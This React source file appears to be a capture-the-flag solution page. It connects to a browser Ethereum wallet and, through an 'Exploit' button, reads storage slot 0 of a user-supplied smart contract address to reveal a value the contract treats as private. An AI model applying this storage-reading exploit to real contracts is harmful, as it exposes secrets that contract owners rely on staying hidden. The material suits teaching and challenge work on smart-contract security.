import React, { useEffect, useState } from 'react';
import Web3 from 'web3';

function App() {
  const [account, setAccount] = useState("");
  const [chainId, setChainId] = useState("");
  const [text, setText] = useState("");
  const [exploitedValue, setExploitedValue] = useState("");

  useEffect(async () => {
    let provider = window.ethereum;
    let web3 = new Web3(provider);
    await provider.request({method: "eth_requestAccounts"}).then(accounts => {
      setAccount(accounts[0]);
    })
    await web3.eth.getChainId().then(chainID => {
      setChainId(chainID);
    })
  }, []);

  const exploitContract = async () => {
    let provider = window.ethereum;
    let web3 = new Web3(provider);
    await web3.eth.getStorageAt(text, 0).then(value => {
      setExploitedValue(web3.utils.hexToNumberString(value));
    });
  }

  return (
    <div className="App">
      <header className="App-header">
        <center><h1>Solution:</h1></center>
      </header>
      <center>Address: {account}</center>
      <center>Chain ID: {chainId}</center>
      <br>
      </br>
      <center>
        <form>
          <label>
            Contract Address: 
            <input type="text" onChange={event => setText(event.target.value)}/>
          </label>
          <br></br>
          <br></br>
          <button type="button" onClick={exploitContract}>Exploit</button>
        </form>
      </center>
      <center>
        {exploitedValue}
      </center>
    </div>
  );
}

export default App;
